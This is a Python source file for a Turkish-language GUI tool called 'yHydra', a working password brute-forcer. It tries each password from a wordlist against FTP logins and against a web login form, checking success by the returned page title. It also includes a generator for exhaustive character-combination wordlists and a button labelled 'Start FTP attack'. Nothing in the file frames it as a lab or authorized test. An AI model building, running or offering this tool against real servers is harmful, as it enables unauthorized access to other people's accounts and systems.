import tkinter as tk
from tkinter import filedialog, messagebox
import requests
import threading
import time
from lxml import html  # HTML analiz için gerekli
import os
import ftplib

stop_flag = False  # İşlemi durdurmak için global değişken

import itertools


def ftp_brute_force():
    global stop_flag

    server = url_entry.get().strip()
    username = username_entry.get().strip()
    wordlist_path = file_path_var.get().strip()

    if not server or not username or not wordlist_path:
        log_text.config(state=tk.NORMAL)
        log_text.insert(tk.END, "Lütfen tüm alanları doldurun!\n")
        log_text.config(state=tk.DISABLED)
        return

    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, f"FTP brute force işlemi başlıyor...\n")
    log_text.config(state=tk.DISABLED)

    attempt = 0
    start_time = time.time()
    found = False

    try:
        with open(wordlist_path, 'r', encoding="utf-8") as wordlist:
            for password in wordlist:
                if stop_flag:
                    break
                password = password.strip()
                attempt += 1

                try:
                    with ftplib.FTP(server) as ftp:
                        ftp.login(username, password)
                        found = True
                        end_time = time.time()
                        elapsed_time = end_time - start_time

                        log_text.config(state=tk.NORMAL)
                        log_text.insert(
                            tk.END,
                            f"\n*** BAŞARILI ***\nKullanıcı: {username}\nŞifre: {password}\nServer: {server}\nDeneme: {attempt}\nSüre: {elapsed_time:.2f} saniye\n"
                        )
                        log_text.config(state=tk.DISABLED)
                        break
                except ftplib.error_perm:
                    log_text.config(state=tk.NORMAL)
                    log_text.insert(tk.END, f"Deneme {attempt}: Şifre: {password} -> HATALI\n")
                    log_text.see(tk.END)
                    log_text.config(state=tk.DISABLED)

        if not found and not stop_flag:
            log_text.config(state=tk.NORMAL)
            log_text.insert(tk.END, f"\n*** Şifre bulunamadı! {attempt} defa denendi. ***\n")
            log_text.config(state=tk.DISABLED)

    except Exception as e:
        log_text.config(state=tk.NORMAL)
        log_text.insert(tk.END, f"Hata: {e}\n")
        log_text.config(state=tk.DISABLED)




def get_documents_folder():
    # Windows için
    if os.name == "nt":
        return os.environ["USERPROFILE"]
    # Linux/Mac için
    else:
        return os.path.join(os.environ["HOME"], "Documents")


def generate_wordlist(min_length, max_length, char_set, output_file):
    with open(output_file, "w", encoding="utf-8") as file:
        for length in range(min_length, max_length + 1):
            for combination in itertools.product(char_set, repeat=length):
                file.write("".join(combination) + "\n")


# URL erişilebilirlik kontrolü
def check_url_accessibility(url):
    try:
        response = requests.head(url)
        return response.status_code == 200
    except Exception:
        return False

# Brute force işlemini ayrı bir iş parçacığında çalıştır
def start_brute_force_thread():
    global stop_flag
    stop_flag = False  # İşlem başlarken durdurulmuş olmadığından emin ol
    thread = threading.Thread(target=brute_force)
    thread.start()

# Brute force işlemini durdur
def stop_brute_force():
    global stop_flag
    stop_flag = True
    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, "İşlem durduruldu.\n")
    log_text.config(state=tk.DISABLED)

# Konsolu temizleme
def clear_console():
    log_text.config(state=tk.NORMAL)
    log_text.delete(1.0, tk.END)
    log_text.config(state=tk.DISABLED)

def open_wordlist_generator():
    # Alt pencere oluştur
    generator_window = tk.Toplevel(root)
    generator_window.title("Wordlist Generator")
    generator_window.geometry("400x300")
    generator_window.configure(bg="#2d2d2d")

    # Min karakter sayısı
    tk.Label(generator_window, text="Min Karakter Sayısı:", bg="#2d2d2d", fg="white").pack(pady=5)
    min_length_entry = tk.Entry(generator_window, bg="#3c3c3c", fg="white")
    min_length_entry.pack(pady=5)

    # Max karakter sayısı
    tk.Label(generator_window, text="Max Karakter Sayısı:", bg="#2d2d2d", fg="white").pack(pady=5)
    max_length_entry = tk.Entry(generator_window, bg="#3c3c3c", fg="white")
    max_length_entry.pack(pady=5)

    # Kullanılacak karakterler
    tk.Label(generator_window, text="Kullanılacak Karakterler:", bg="#2d2d2d", fg="white").pack(pady=5)
    char_set_entry = tk.Entry(generator_window, bg="#3c3c3c", fg="white")
    char_set_entry.pack(pady=5)

    # Oluştur ve Kaydet butonu
    def generate_and_save_wordlist():
        try:
            min_length = int(min_length_entry.get())
            max_length = int(max_length_entry.get())
            char_set = char_set_entry.get()
            if min_length <= 0 or max_length < min_length or not char_set:
                raise ValueError("Geçersiz giriş!")
            
            path_to_documents_folder = get_documents_folder()
            messagebox.showinfo("Bilgi", f"Wordlist dosyası {path_to_documents_folder} klasörüne kaydedilecek.")
            generate_wordlist(min_length, max_length, char_set, path_to_documents_folder+"\gen_wordlist.txt")
            messagebox.showinfo("Başarılı", "Wordlist başarıyla oluşturuldu ve kaydedildi!")

        except Exception as e:
            messagebox.showerror("Hata", f"Wordlist oluşturulurken hata oluştu:\n{e}")

    tk.Button(
        generator_window, text="Oluştur ve Kaydet", command=generate_and_save_wordlist,
        bg="#1c8c1c", fg="white", activebackground="#1e9d1e", activeforeground="white", relief="flat"
    ).pack(pady=20)


# Brute force fonksiyonu
def brute_force():
    global stop_flag

    url = url_entry.get().strip()
    username = username_entry.get().strip()
    wordlist_path = file_path_var.get().strip()

    if not url or not username or not wordlist_path:
        log_text.config(state=tk.NORMAL)
        log_text.insert(tk.END, "Lütfen tüm alanları doldurun!\n")
        log_text.config(state=tk.DISABLED)
        return

    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, f"Başlangıç: URL erişilebilirliği kontrol ediliyor...\n")
    log_text.config(state=tk.DISABLED)

    if not check_url_accessibility(url):
        log_text.config(state=tk.NORMAL)
        log_text.insert(tk.END, f"HATA: {url} adresine ulaşılamadı!\n")
        log_text.config(state=tk.DISABLED)
        return

    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, f"{url} erişilebilir. İşlem başlıyor...\n")
    log_text.config(state=tk.DISABLED)

    start_time = time.time()
    found = False
    attempt = 0

    try:
        with open(wordlist_path, 'r', encoding="utf-8") as wordlist:
            for password in wordlist:
                if stop_flag:
                    break  # İşlem durdurulursa döngüyü kes
                password = password.strip()
                attempt += 1

                payload = {"tfUName": username, "tfUPass": password}
                response = requests.post(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})

                # Başarılı giriş kontrolü (title içeriği)
                tree = html.fromstring(response.text)
                title_text = tree.xpath("//title/text()")
                is_success = "login" not in "".join(title_text).lower()

                log_text.config(state=tk.NORMAL)
                log_text.insert(tk.END, f"Deneme {attempt}: Şifre: {password} -> {'BAŞARILI' if is_success else 'HATALI'}\n")
                log_text.insert(tk.END, f"Gönderilen: {payload}\n")
                log_text.see(tk.END)
                log_text.config(state=tk.DISABLED)

                if is_success:
                    found = True
                    end_time = time.time()
                    elapsed_time = end_time - start_time
                    log_text.config(state=tk.NORMAL)
                    log_text.insert(
                        tk.END,
                        f"\n*** BAŞARILI ***\nKullanıcı: {username}\nŞifre: {password}\n"
                        f"URL: {url}\nBulundu: {attempt}. sırada\nSüre: {elapsed_time:.2f} saniye\n"
                    )
                    log_text.config(state=tk.DISABLED)
                    break

        if not found and not stop_flag:
            log_text.config(state=tk.NORMAL)
            log_text.insert(tk.END, f"\n*** Şifre bulunamadı! {attempt} defa denendi. ***\n")
            log_text.config(state=tk.DISABLED)

    except Exception as e:
        log_text.config(state=tk.NORMAL)
        log_text.insert(tk.END, f"Hata: {e}\n")
        log_text.config(state=tk.DISABLED)

# Tkinter GUI
root = tk.Tk()
root.title("yHydra")
root.geometry("800x600")
root.configure(bg="#2d2d2d")

font = ("Roboto", 12)
root.option_add("*Font", font)

tk.Label(root, text="Bağlantı Adresi:", bg="#2d2d2d", fg="white").pack(pady=5)
url_entry = tk.Entry(root, width=60, bg="#3c3c3c", fg="white", insertbackground="white", highlightbackground="#555555", relief="flat")
url_entry.pack(pady=5)

tk.Label(root, text="Kullanıcı Adı:", bg="#2d2d2d", fg="white").pack(pady=5)
username_entry = tk.Entry(root, width=60, bg="#3c3c3c", fg="white", insertbackground="white", highlightbackground="#555555", relief="flat")
username_entry.pack(pady=5)

tk.Label(root, text="Wordlist Dosyası:", bg="#2d2d2d", fg="white").pack(pady=5)
file_path_var = tk.StringVar()
file_entry = tk.Entry(root, textvariable=file_path_var, width=60, bg="#3c3c3c", fg="black", state="readonly", relief="flat")
file_entry.pack(pady=5)
tk.Button(
    root, text="Dosya Seç", command=lambda: file_path_var.set(filedialog.askopenfilename()),
    bg="#555555", fg="white", activebackground="#666666", activeforeground="white", relief="flat", width=15
).pack(pady=5)

tk.Button(
    root, text="Başlat", command=start_brute_force_thread,
    bg="#1c8c1c", fg="white", activebackground="#1e9d1e", activeforeground="white", relief="flat", width=15
).pack(pady=5)


tk.Button(
    root, text="FTP Saldırısını Başlat", command=lambda: threading.Thread(target=ftp_brute_force).start(),
    bg="#1c8c1c", fg="white", activebackground="#1e9d1e", activeforeground="white", relief="flat", width=25
).pack(pady=5)

tk.Button(
    root, text="Durdur", command=stop_brute_force,
    bg="#8c1c1c", fg="white", activebackground="#9d1e1e", activeforeground="white", relief="flat", width=15
).pack(pady=5)

tk.Button(
    root, text="Temizle", command=clear_console,
    bg="#555555", fg="white", activebackground="#666666", activeforeground="white", relief="flat", width=15
).pack(pady=5)

tk.Button(
    root, text="Wordlist Generator", command=open_wordlist_generator,
    bg="#555555", fg="white", activebackground="#666666", activeforeground="white", relief="flat", width=20
).pack(pady=5)


tk.Label(root, text="Loglar:", bg="#2d2d2d", fg="white").pack(pady=5)
log_frame = tk.Frame(root)
log_frame.pack(pady=5, fill=tk.BOTH, expand=True)

log_text = tk.Text(log_frame, width=90, height=15, bg="#000000", fg="#00ff00", font=("Consolas", 10), relief="flat", state=tk.DISABLED, wrap=tk.WORD)
log_scrollbar = tk.Scrollbar(log_frame, command=log_text.yview)
log_text.configure(yscrollcommand=log_scrollbar.set)
log_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

root.mainloop()
